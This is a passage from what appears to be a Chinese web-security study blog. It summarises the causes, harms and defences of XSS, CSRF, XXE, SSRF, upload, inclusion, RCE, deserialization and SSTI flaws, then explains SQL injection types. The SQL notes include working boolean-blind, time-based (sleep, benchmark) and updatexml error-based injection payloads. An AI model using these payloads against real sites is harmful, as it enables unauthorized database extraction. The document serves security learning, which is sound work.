<h3 id="2-危害-1"><a href="#2-危害-1" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①盗取用户Cookie。<br>②修改网页内容。<br>③网站挂马。<br>④利用网站重定向。<br>⑤XSS蠕虫。</p>
</blockquote>
<h3 id="3-防御-1"><a href="#3-防御-1" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①过滤输入的数据：包括” ’ ”、”&lt;”、“&lt;”、“&gt;”、“on”等非法字符。<br>②对输出到页面的数据进行相应的编码转换，包括html实体编码、javascript编码等。</p>
</blockquote>
<h2 id="三、csrf漏洞篇"><a href="#三、csrf漏洞篇" class="headerlink" title="三、csrf漏洞篇"></a>三、csrf漏洞篇</h2><h3 id="1-csrf漏洞原理"><a href="#1-csrf漏洞原理" class="headerlink" title="1.csrf漏洞原理"></a>1.csrf漏洞原理</h3><p>因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，<u><strong>没有校验表单token或者http请求头中的referer值</strong></u>（如果您<u><strong>在网页1，点击一个链接到网页2</strong></u>，当浏览器<u><strong>请求网页2时，网页1的URL就会包含在 Referer 头信息</strong></u>中），从而<u><strong>导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为</strong></u>。</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230803154603968.png"><img src="/Web-study/image-20230803154603968.png" alt="image-20230803154603968"></a></p>
<p>Csrf攻击过程两个重点：</p>
<blockquote>
<p>①目标用户<u><strong>已经登录了网站</strong></u>，<u><strong>能够执行网站的功能</strong></u>。<br>②目标用户<u><strong>访问了攻击者构造的URL</strong></u>。</p>
</blockquote>
<h3 id="2-危害-2"><a href="#2-危害-2" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①伪造HTTP请求进行未授权操作。<br>②篡改、盗取目标网站上的重要用户数据。<br>③未经允许执行对用户名誉或者资产有害的操作，比如：散播不良信息、进行消费等。<br>④如果通过使用社工等方式攻击网站管理员、会危害网站本身的安全性。<br>⑤作为其他攻击向量的辅助攻击手法，必须配合XSS<br>⑥传播CSRF蠕虫</p>
</blockquote>
<h3 id="3-防御-2"><a href="#3-防御-2" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①验证请求的<u><strong><code>referer</code></strong></u>值，如果referer是以自己的网站开头的域名，则说明该请求来自网站自己，是合法的。<u><strong>如果referer是其他网站域名或空白，就有可能是csrf攻击，那么服务器拒绝该请求</strong></u>，但是此方法存在被绕过的可能【<u><strong>brupsuite可以抓包修改referer从而绕过前端过滤</strong></u>】。<br>②csrf攻击之所以能成功，是因为<u><strong>攻击者伪造用户的请求</strong></u>，所以抵御csrf的关键在于：在<u><strong>请求中放入攻击者不能伪造的请求</strong></u>，例如，可以在HTTP请求中加入一个随机产生的token，并在服务器端<u><strong>验证token</strong></u>【<u><strong>类似于验证码</strong></u>】，如果请求中没有token或者token内容不正确，则认为请求可能是csrf攻击，从而拒绝该请求。</p>
</blockquote>
<h2 id="四、xxe漏洞篇"><a href="#四、xxe漏洞篇" class="headerlink" title="四、xxe漏洞篇"></a>四、xxe漏洞篇</h2><h3 id="1-xxe漏洞原理"><a href="#1-xxe漏洞原理" class="headerlink" title="1.xxe漏洞原理"></a>1.xxe漏洞原理</h3><p>XML 外部实体攻击是针对解析 XML 输入的应用程序的一种攻击。当<strong>包含对外部实体的引用的 XML 输入由弱配置的 XML 解析器处理</strong>时，就会发生这种攻击。这种攻击可能导致<strong>机密数据泄露、拒绝服务、服务器端请求伪造、从解析器所在机器的角度进行端口扫描</strong>等系统影响。</p>
<p>攻击可能包括使用系统标识符中的 <code>file: 方案或相对路径公开本地文件</code>，这些文件<strong>可能包含敏感数据，例如密码或私人用户数据</strong>。由于<strong>攻击发生与处理 XML 文档的应用程序相关</strong>，因此<strong>攻击者可能会使用此受信任的应用程序转向其他内部系统</strong>，可能通过 http(s) 请求泄露其他内部内容或<strong>对任何未受保护的内部服务发起 CSRF 攻击</strong>。在某些情况下，易受客户端内存损坏问题影响的 XML 处理器库<strong>可能会通过解除对恶意 URI 的引用而被利用</strong>，<strong>从而可能允许在应用程序帐户下执行任意代码</strong>。其他攻击可以访问可能不会停止返回数据的本地资源，</p>
<p>一般来说，我们可以区分以下几种 XXE 攻击：</p>
<blockquote>
<ul>
<li>典型注入：在这种情况下，外部实体包含在本地 DTD 中</li>
<li>盲注：响应中没有显示输出和&#x2F;或错误</li>
<li>报错注入：尝试在错误消息中获取资源的内容</li>
</ul>
</blockquote>
<p>XML文档结构包括<u><strong>XML声明、DTD文档类型定义（可选）、文档元素</strong></u>。</p>
<h3 id="2-危害-3"><a href="#2-危害-3" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①读取任意文件。<br>②执行系统命令。<br>③探测内网端口。<br>④攻击内网网站。</p>
</blockquote>
<h3 id="3-防御-3"><a href="#3-防御-3" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①禁止使用<u><strong>外部实体</strong></u>，例如：<br>PHP：libxml_disable_entity_loader(true)<br>②过滤用户提交的xml数据，防止出现非法内容。</p>
</blockquote>
<h2 id="五、ssrf漏洞篇"><a href="#五、ssrf漏洞篇" class="headerlink" title="五、ssrf漏洞篇"></a>五、ssrf漏洞篇</h2><h3 id="1-ssrf漏洞原理"><a href="#1-ssrf漏洞原理" class="headerlink" title="1.ssrf漏洞原理"></a>1.ssrf漏洞原理</h3><p>大都是由于<u><strong>服务器提供了从其他服务器应用获取数据的功能</strong></u>且<u><strong>没有对目标地址做过滤与限制</strong></u><strong>。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</strong><u><strong>利用的是服务端的请求伪造</strong></u>。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220802103546644.png"><img src="/Web-study/image-20220802103546644.png" alt="image-20220802103546644"></a></p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20220802103603770.png"><img src="/Web-study/image-20220802103603770.png" alt="image-20220802103603770"></a></p>
<h3 id="2-危害-4"><a href="#2-危害-4" class="headerlink" title="2.危害"></a>2.危害</h3><p>攻击者就可以<u><strong>利用该漏洞绕过防火墙等访问限制</strong></u>，进而将受感染或存在漏洞的服务器作为代理进行端口扫描，甚至是访问内部系统数据。</p>
<blockquote>
<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息</p>
<p>2.攻击运行在内网或本地的应用程序</p>
<p>3.对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)</p>
<p>4.攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)</p>
<p>5.下载内网资源(如：利用file协议读取本地文件等)</p>
<p>6.进行跳板</p>
<p>7.无视cdn</p>
<p>8.利用Redis未授权访问，HTTP CRLF注入实现getshell</p>
</blockquote>
<h3 id="3-防御-4"><a href="#3-防御-4" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>① 限制请求的端口只能为web端口，只允许访问HTTP和HTTPS请求。<br>② 限制不能访问内网的IP，以防止对内网进行攻击。<br>③ 屏蔽返回的详细信息。<br>④ 限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等。</p>
</blockquote>
<blockquote>
<p>PHP中下面函数的使用不当会导致SSRF:</p>
<p>file_get_contents()</p>
<p>fsockopen()<br>#在PHP中fsockopen函数的作用是打开一个网络连接或者一个Unix套接字连接，其语法为“fsockopen($hostname) ”，返回值为一个文件句柄，之后可以被其他文件类函数调用</p>
<p>curl_exec()</p>
</blockquote>
<h2 id="六、文件上传漏洞篇"><a href="#六、文件上传漏洞篇" class="headerlink" title="六、文件上传漏洞篇"></a>六、文件上传漏洞篇</h2><h3 id="1-文件上传漏洞原理"><a href="#1-文件上传漏洞原理" class="headerlink" title="1.文件上传漏洞原理"></a>1.文件上传漏洞原理</h3><p>就是未对用户上传的文件进行检查和过滤，导致某些别有用心的用户上传了一些恶意代码或文件（<code>asp、php、jsp</code>等），从而控制了网站。（当文件上传时，如果服务端的脚本语言没有对上传的文件进行检查和过滤，那假如，渗透者直接上传恶意代码文件，那么就有可能直接控制整个网站，或者说以此为跳板，直接拿下服务器，这就是文件上传漏洞。）</p>
<h3 id="2-危害-5"><a href="#2-危害-5" class="headerlink" title="2.危害"></a>2.危害</h3><p><u><strong>非法用户可以利用恶意脚本文件控制整个网站，甚至控制服务器</strong></u>。这个恶意脚本文件，又称为webshell，也可将webshell脚本称为一种网页后门，webshell脚本具有很强大的功能，<u><strong>比如查看服务器目录、服务器中的文件，执行绕过命令等。</strong></u>【<strong>用蚁剑或菜刀连接上传的 php文件，输入文件中的密码</strong>】</p>
<h3 id="3-防御-5"><a href="#3-防御-5" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①通过白名单方式判断文件后缀是否合法。<br>②对上传的文件进行重命名。</p>
</blockquote>
<hr>
<h2 id="七、文件包含漏洞篇"><a href="#七、文件包含漏洞篇" class="headerlink" title="七、文件包含漏洞篇"></a>七、文件包含漏洞篇</h2><h3 id="1-文件包含漏洞原理"><a href="#1-文件包含漏洞原理" class="headerlink" title="1.文件包含漏洞原理"></a>1.文件包含漏洞原理</h3><p>开发人员将<u><strong>需要重复调用的函数写入一个文件，对该文件进行包含是产生的操作</strong></u>。这样编写代码能减少代码冗余，降低代码后期维护难度，保证网站整体风格统一：导航栏、底部footer栏等。<u><strong>文件包含函数加载的参数没有经过过滤或严格定义，可以被用户控制，包含其他恶意文件，导致了执行非预期代码</strong></u>。</p>
<h3 id="2-危害-6"><a href="#2-危害-6" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①获取敏感信息<br>②执行任意命令<br>③获取服务器权限</p>
</blockquote>
<h3 id="3-防御-6"><a href="#3-防御-6" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①建议白名单。<br>②指定访问一定的路径，再将参数拼接到路径当中。</p>
</blockquote>
<hr>
<h2 id="八、逻辑漏洞漏洞篇"><a href="#八、逻辑漏洞漏洞篇" class="headerlink" title="八、逻辑漏洞漏洞篇"></a>八、逻辑漏洞漏洞篇</h2><h3 id="1-逻辑漏洞漏洞原理"><a href="#1-逻辑漏洞漏洞原理" class="headerlink" title="1.逻辑漏洞漏洞原理"></a>1.逻辑漏洞漏洞原理</h3><p>指攻击者<u><strong>利用业务的设计缺陷，获取敏感信息或破坏业务的完整性</strong></u>。一般出现在<u><strong>密码修改、越权访问、密码找回、交易支付</strong></u>等功能处。</p>
<h3 id="2-危害-7"><a href="#2-危害-7" class="headerlink" title="2.危害"></a>2.危害</h3><p>任意密码修改、越权访问、密码任意找回、交易支付金额任意修改等</p>
<h3 id="3-防御-7"><a href="#3-防御-7" class="headerlink" title="3.防御"></a>3.防御</h3><h4 id="1-任意密码修改"><a href="#1-任意密码修改" class="headerlink" title="1.任意密码修改"></a>1.任意密码修改</h4><h4 id="2-越权访问"><a href="#2-越权访问" class="headerlink" title="2.越权访问"></a>2.越权访问</h4><p>越权访问漏洞产生<u><strong>主要原因是没有对用户的身份做判断和控制</strong></u>，防范这种漏洞时，可以通过session来控制。</p>
<p>例如，在用户登录时，将username或uid写入到<code>session</code><u><strong><code>（会话控制，Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。）</code></strong></u>中取出信息，<u><strong><code>而不是从GET或POST取出username</code></strong></u>，name此时取到的username就是没有篡改的。</p>
<hr>
<h2 id="九、命令执行漏洞篇"><a href="#九、命令执行漏洞篇" class="headerlink" title="九、命令执行漏洞篇"></a>九、命令执行漏洞篇</h2><h3 id="1-命令执行漏洞原理"><a href="#1-命令执行漏洞原理" class="headerlink" title="1.命令执行漏洞原理"></a>1.命令执行漏洞原理</h3><p>应用未对用户输入做严格的检查过滤，导致用户<u><strong>输入的参数被当成命令来执行</strong></u>。攻击者可以任意执行系统命令，属于高危漏洞之一，也属于代码执行的范畴。</p>
<h3 id="2-危害-8"><a href="#2-危害-8" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①继承web服务程序的权限去执行系统命令或读写文件。<br>②反弹shell，获得目标服务器的权限。<br>③进一步内网渗透。</p>
</blockquote>
<h3 id="3-防御-8"><a href="#3-防御-8" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>①尽量不要使用命令执行函数。<br>②客户端<u><strong>提交的变量在进入执行命令函数前</strong></u>要做好<u><strong>过滤和检测</strong></u>。<br>③在<u><strong>使用动态函数之前</strong></u>，确保使用函数是<u><strong>指定的函数</strong></u>之一。<u><strong>【防止攻击者引入新函数（非网站使用的函数）执行攻击语句】</strong></u><br>④对<u><strong>php语言</strong></u>而言，<u><strong>不能完全控制的危险函数最好不要使用</strong></u>。</p>
</blockquote>
<hr>
<h2 id="十、暴力破解篇"><a href="#十、暴力破解篇" class="headerlink" title="十、暴力破解篇"></a>十、暴力破解篇</h2><h3 id="1-暴力破解原理"><a href="#1-暴力破解原理" class="headerlink" title="1.暴力破解原理"></a>1.暴力破解原理</h3><p>由于服务器端没有做限制，导致攻击者可以通过暴力手段破解所需信息，如用户名、密码、验证码等。暴力破解需要一个强大的字典，如4位数字的验证码，那么暴力破解的范围就是0000~9999，<u><strong>暴力破解的关键在于字典的大小</strong></u>。</p>
<h3 id="2-危害-9"><a href="#2-危害-9" class="headerlink" title="2.危害"></a>2.危害</h3><blockquote>
<p>①用户密码被重置。<br>②敏感目录、参数被枚举。<br>③用户订单被枚举。</p>
</blockquote>
<h3 id="3-防御-9"><a href="#3-防御-9" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>① 如果<u><strong>用户登录次数超过设置的阈值</strong></u>，则<u><strong>锁定账号</strong></u>。<br>② 如果<u><strong>某个IP登陆次数超过设置的阈值，则锁定IP</strong></u>。但<u><em><strong>存在一个问题</strong></em></u>，如果<u><strong>多个用户使用的是同一个IP，则会造成其他用户也不能登录。</strong></u></p>
</blockquote>
<hr>
<h2 id="十一、Deserialization-Vulnerabilities（PHP）"><a href="#十一、Deserialization-Vulnerabilities（PHP）" class="headerlink" title="十一、Deserialization Vulnerabilities（PHP）"></a>十一、Deserialization Vulnerabilities（PHP）</h2><h3 id="1-Deserialization-Vulnerabilities漏洞原理"><a href="#1-Deserialization-Vulnerabilities漏洞原理" class="headerlink" title="1.Deserialization Vulnerabilities漏洞原理"></a>1.Deserialization Vulnerabilities漏洞原理</h3><p>PHP反序列化漏洞也叫PHP对象注入，是一个非常常见的漏洞，这种类型的漏洞虽然有些难以利用，但一旦利用成功就会造成非常危险的后果。</p>
<p>漏洞的形成的<u><strong>根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果</strong></u>。反序列化漏洞并不是PHP特有，<u><strong>也存在于Java、Python等语言</strong></u>之中，但其原理基本相通。</p>
<p>PHP类都含有几个特定的元素: 类属性、类常量、类方法。每一个类至少都含有以上三个元素，而这三个元素也可以组成最基本的类。那么按照特定的格式将这三个元素表达出来就可以将一个完整的类表示出来并传递。</p>
<p><u>序列化就是将一个<strong>类</strong>压缩成一个字符串的方法</u></p>
<h3 id="2-危害-10"><a href="#2-危害-10" class="headerlink" title="2.危害"></a>2.危害</h3><p><u><strong>未对用户输入的序列化字符串进行检测</strong></u>，导致<u><strong>攻击者可以控制反序列化过程</strong></u>，从而<u><strong>导致代码执行，SQL注入，目录遍历等不可控后果</strong></u>。在反序列化的过程中自动触发了某些魔术方法。</p>
<h3 id="3-防御-10"><a href="#3-防御-10" class="headerlink" title="3.防御"></a>3.防御</h3><h4 id="1-签名与认证"><a href="#1-签名与认证" class="headerlink" title="1)签名与认证"></a>1)签名与认证</h4><p>如果序列化的内容没有用户可控参数，仅仅是服务端存储和应用，则可以通过签名认证，来避免应用接受黑客的异常输入。   </p>
<h4 id="2-限制序列化与反序列化的类"><a href="#2-限制序列化与反序列化的类" class="headerlink" title="2)限制序列化与反序列化的类"></a>2)限制序列化与反序列化的类</h4><p>增加一层序列化和反序列化接口类。这就相当于允许提供了一个白名单的过滤：只允许某些类可以被反序列化。只要你在反序列化的过程中，避免接受处理任何类型（包括类成员中的接口、泛型等），黑客其实很难控制应用反序列化过程中所使用的类，也就没有办法构造出调用链，自然也就很难利用反序列化漏洞了</p>
<h4 id="3-RASP检测"><a href="#3-RASP检测" class="headerlink" title="3)RASP检测"></a>3)RASP检测</h4><p>（<code>Runtime Application Self-Protection</code>，实时程序自我保护）。RASP 通过 hook 等方式，在这些关键函数（例如：序列化，反序列化)的调用中，增加一道规则的检测。这个规则会判断应用是否执行了非应用本身的逻辑，能够在不修改代码的情况下对反序列化漏洞攻击实现拦截.</p>
<h3 id="4-利用"><a href="#4-利用" class="headerlink" title="4.利用"></a>4.利用</h3><h4 id="1-wakeup-绕过"><a href="#1-wakeup-绕过" class="headerlink" title="1)__wakeup( )绕过"></a>1)__wakeup( )绕过</h4><p><code>(CVE-2016-7124)</code></p>
<p>反序列化时，如果表示对象<code>属性个数的值大于真实的属性个数</code>时就会<code>跳过__wakeup( )的执行</code>。</p>
<h4 id="2-注入对象构造方法"><a href="#2-注入对象构造方法" class="headerlink" title="2)注入对象构造方法"></a>2)注入对象构造方法</h4><p>当目标对象被<code>private、protected修饰时的构造方法</code>。</p>
<h4 id="3-Session反序列化漏洞"><a href="#3-Session反序列化漏洞" class="headerlink" title="3)Session反序列化漏洞"></a>3)Session反序列化漏洞</h4><p>PHP中的<code>Session经序列化后存储，读取时再进行反序列化</code>。</p>
<h4 id="4-PHAR利用"><a href="#4-PHAR利用" class="headerlink" title="4)PHAR利用"></a>4)PHAR利用</h4><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p>
<hr>
<h2 id="十二、rce漏洞篇"><a href="#十二、rce漏洞篇" class="headerlink" title="十二、rce漏洞篇"></a>十二、rce漏洞篇</h2><h3 id="1-rce漏洞原理"><a href="#1-rce漏洞原理" class="headerlink" title="1.rce漏洞原理"></a>1.rce漏洞原理</h3><p>一般出现这种漏洞，是因为应用系统<u><strong>从设计上需要给用户提供指定的远程命令操作的接口</strong></u>。比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上。一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 如果，设计者在完成该功能时，<u><strong>没有做严格的安全控制，则可能会<code>导致攻击者通过该接口提交“意想不到”的命令</code>，从而让后台进行执行，从而控制整个后台服务器</strong></u>。 现在很多的企业都开始实施自动化运维,大量的系统操作会通过”自动化运维平台”进行操作。在这种平台上往往会出现远程系统命令执行的漏洞。 远程代码执行 同样的道理,因为需求设计,后台有时候也会把用户的输入作为代码的一部分进行执行,也就造成了远程代码执行漏洞。 不管是使用了代码执行的函数,还是使用了不安全的反序列化等等。 </p>
<blockquote>
<p>因此，如果需要给<u><strong>前端用户提供操作类的API接口（一般指应用程序的编程接口，主要目的是提供应用程序与开发人员以访问一组例程的能力，而又无需访问源码，或理解内部工作机制的细节），一定需要对接口输入的内容进行严格的判断</strong></u>，比如<code>实施严格的白名单策略</code>会是一个比较好的方法。</p>
</blockquote>
<h3 id="2-危害-11"><a href="#2-危害-11" class="headerlink" title="2.危害"></a>2.危害</h3><p>RCE漏洞，可以让攻击者直接向后台服务器远程注入<u><strong>操作系统命令或者代码</strong></u>，从而控制后台系统。</p>
<h3 id="3-防御-11"><a href="#3-防御-11" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>1)尽量不要使用命令执行函数。</p>
<p>2)不要让用户控制参数。</p>
<p>3)执行前做好检测和过滤。</p>
</blockquote>
<h2 id="十三、ssti漏洞篇"><a href="#十三、ssti漏洞篇" class="headerlink" title="十三、ssti漏洞篇"></a>十三、ssti漏洞篇</h2><h3 id="1-ssti漏洞原理"><a href="#1-ssti漏洞原理" class="headerlink" title="1.ssti漏洞原理"></a>1.ssti漏洞原理</h3><p><a href="https://xz.aliyun.com/t/3679#toc-0">推荐文章</a></p>
<p>SSTI是一种注入类的漏洞，其<code>成因也可以类比SQL注入</code><br>SQL注入是从用户获得一个输入，然后用后端脚本语言进行数据库查询，利用输入来拼接我们想要的SQL语句。SSTI也是获取一个输入，然后在后端的渲染处理上进行语句的拼接执行。但是和SQL注入不同的，</p>
<p>SSTI利用的是现有的网站模板引擎，主要针对Python、PHP、JAVA的一些网站处理框架，比如Python的<strong>jinja2、mako、tornado、Django</strong>，PHP的<strong>smarty twig</strong>，java的<strong>jade velocity</strong>。当这些框架对运用渲染函数生成html的时候，在过滤不严情况下，通过构造恶意输入数据，从而达到getshell或其他目的。</p>
<blockquote>
<p><code>一句话就是服务端在接收用户输入或用户可控参数后，未作处理或未进行严格过滤，直接嵌入模板渲染，导致执行恶意代码</code></p>
</blockquote>
<p><strong>模板注入</strong>涉及的是服务端Web应用使用模板引擎<strong>渲染用户请求的过程</strong>，<br> 服务端把<strong>用户输入的内容渲染成模板</strong>就可能造成SSTI(Server-Side Template Injection)</p>
<p>模板渲染接受的参数需要用两个大括号<code>&#123;  &#123;&#125;  &#125;</code>括起来</p>
<h3 id="2-危害-12"><a href="#2-危害-12" class="headerlink" title="2.危害"></a>2.危害</h3><p>攻击者在服务器输入语句，服务端将其<u><strong>作为Web应用模板内容的一部分</strong></u>，在进行<u><strong>目标编译渲染</strong></u>的过程中，<u><strong>进行了语句的拼接，执行了所插入的恶意内容</strong></u>，从而<u><strong>导致信息泄露、代码执行、GetShell等</strong></u>问题</p>
<h3 id="3-防御-12"><a href="#3-防御-12" class="headerlink" title="3.防御"></a>3.防御</h3><blockquote>
<p>1）和其他的注入防御一样，<u><strong>绝对不要让用户对传入模板的内容或者模板本身进行控制</strong></u></p>
<p>2）<u><strong>减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染</strong></u>方式，<u><strong>使用正规的模板渲染方法</strong></u></p>
</blockquote>
<h1 id="漏洞知识点记录笔记（一）"><a href="#漏洞知识点记录笔记（一）" class="headerlink" title="漏洞知识点记录笔记（一）"></a>漏洞知识点记录笔记（一）</h1><blockquote>
<p>补充一些知识点</p>
</blockquote>
<h2 id="一、sql"><a href="#一、sql" class="headerlink" title="一、sql"></a>一、sql</h2><h3 id="sql注入的分类"><a href="#sql注入的分类" class="headerlink" title="sql注入的分类"></a>sql注入的分类</h3><h4 id="1-按照数据提交的方式来分类："><a href="#1-按照数据提交的方式来分类：" class="headerlink" title="1.按照数据提交的方式来分类："></a>1.按照数据提交的方式来分类：</h4><p>  （1）<code>GET</code> 注入：提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<code>http://xxx.com/news.php?id=1</code> , id 是注入点。</p>
<p>  （2）<code>POST</code> 注入：使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中(输入框)。</p>
<p>  （3）<code>Cookie</code> 注入：HTTP请求的时候会带上客户端的Cookie, 注入点在Cookie当中的某个字段中。</p>
<p>  （4）<code>HTTP</code> 头部注入：注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p>
<h4 id="ps-下面几点是注入中经常会用到的语句"><a href="#ps-下面几点是注入中经常会用到的语句" class="headerlink" title="ps.下面几点是注入中经常会用到的语句"></a>ps.下面几点是注入中经常会用到的语句</h4><blockquote>
<p>控制语句操作<code>(select, case, if(), …)</code></p>
<p>比较操作<code>(=, like, mod(), …)</code></p>
<p>字符串的猜解操作<code>(mid(), left(), rpad(), …)</code></p>
<p>字符串生成操作<code>(0x61, hex(), conv()(使用conv([10-36],10,36)</code>可以实现所有字符的表示))</p>
</blockquote>
<h4 id="2-按照执行效果来分类："><a href="#2-按照执行效果来分类：" class="headerlink" title="2.按照执行效果来分类："></a>2.按照执行效果来分类：</h4><h5 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h5><blockquote>
<p>也可以用if函数进行</p>
<p>例如</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(ascii(substr((<span class="keyword">select</span>(database())),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>如果条件符号返回1，不符合返回2</p>
</blockquote>
<blockquote>
<p>bool盲注，即可以根据返回页面判断条件真假的注入。</p>
<p>一般根据数据字符asiic码大小或字符长短，用二分法进行判断字符答案</p>
<p>长度比如</p>
</blockquote>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> length(database()) &gt; <span class="number">5</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>意思就是判断数据库名大于5，如果返回假就在小于5里找，如果返回真，就在大于5范围里找，猜测到大概的长度的时候，可以用&#x3D;试试</p>
</blockquote>
<blockquote>
<p>对于单一字符猜测，可以利用字母的<code>ascii</code>码，</p>
</blockquote>
<p>比如</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>substr是截取字符，如上就是从第一个字符截取，截取一个字符<br>意思就是判断数据库名第一个字母的ascii码是否大于110，返回假就在小于110里找，返回真，就在大于110里找，最后可以用&#x3D;加以确定</p>
</blockquote>
<p><code>可以用burpsuite进行payload爆破，用数字字典，直接从0-127（ascii码共127位），然后根据回显，判断，就不用一个一个慢慢尝试</code></p>
<p><code>强烈建议可以学习一下python，这样可以自己针对性的写一个脚本，效率更高</code></p>
<h5 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h5><blockquote>
<p>即不能根据页面返回内容判断任何信息，用条件语句（if）查看时间延迟语句（sleep()）是否执行（即页面返回时间是否增加）来判断。</p>
</blockquote>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="keyword">if</span>(length(database()&gt;<span class="number">7</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里判断如果数据库名大于7，就延迟网页5s，反正没有延迟【就是执行1】，剩下的和bool盲注一样，挨个试试，推测出数据库名和其他数据</p>
</blockquote>
<h6 id="时间盲注的函数或者方法"><a href="#时间盲注的函数或者方法" class="headerlink" title="时间盲注的函数或者方法"></a>时间盲注的函数或者方法</h6><blockquote>
<ul>
<li><p><strong>sleep()</strong></p>
</li>
<li><p>**benchmark ()**：测定某些特定操作的执行速度，结果值总是0，仅仅会执行显示时间</p>
<blockquote>
<p>benchmark (count,expr)，expr为执行表达式，count为执行次数</p>
<p>常用语句</p>
<p>SELECT BENCHMARK(100000000,(select database()));</p>
</blockquote>
</li>
<li><p><strong>笛卡尔积</strong>：通过做大量的查询导致查询时间较长来达到延时的目的。通常选择一些比较大的表做笛卡尔积运算</p>
</li>
</ul>
</blockquote>
<h5 id="（3）基于报错注入"><a href="#（3）基于报错注入" class="headerlink" title="（3）基于报错注入"></a>（3）基于报错注入</h5><blockquote>
<p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。如：单引号、双引号、基于数字型注入。</p>
</blockquote>
<p>比如，查询数据库名</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p> *<strong>注意</strong></p>
<blockquote>
<p>extractvalue和updatexml只显示<code>32</code>位字符</p>
<p>所以爆出字符不全时，可以用<code>left(xxx,length)</code>和<code>right(xxx,length)</code><br>【注意0x7e也就是<del>也算字符位，按上面例子用了两个</del>，所以这里最多只能select 30个字符了，但左右都30，一共可以select 60个字符】</p>
<p>或者用<code>substr(xxx,begin,length)</code>，从数据的某个开始【这里的开始位是从1开始，而不是0】截取一部分显示</p>
</blockquote>
<h5 id="（4）联合查询注入"><a href="#（4）联合查询注入" class="headerlink" title="（4）联合查询注入"></a>（4）联合查询注入</h5><p>可以使用union的情况下的注入。</p>
<h5 id="（5）堆查询注入（堆叠注入）"><a href="#（5）堆查询注入（堆叠注入）" class="headerlink" title="（5）堆查询注入（堆叠注入）"></a>（5）堆查询注入（堆叠注入）</h5><p>可以同时执行多条语句的执行时的注入。</p>
<h5 id="（6）宽字节注入"><a href="#（6）宽字节注入" class="headerlink" title="（6）宽字节注入"></a>（6）宽字节注入</h5><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个<a href="https://so.csdn.net/so/search?q=ASCII%E7%A0%81&spm=1001.2101.3001.7020">ASCII码</a>要大于128，才到汉字的范围），示例如下图：</p>
<p><a data-fancybox="gallery" data-src="/Web-study/image-20230806195837908.png"><img src="/Web-study/image-20230806195837908.png" alt="image-20230806195837908"></a></p>
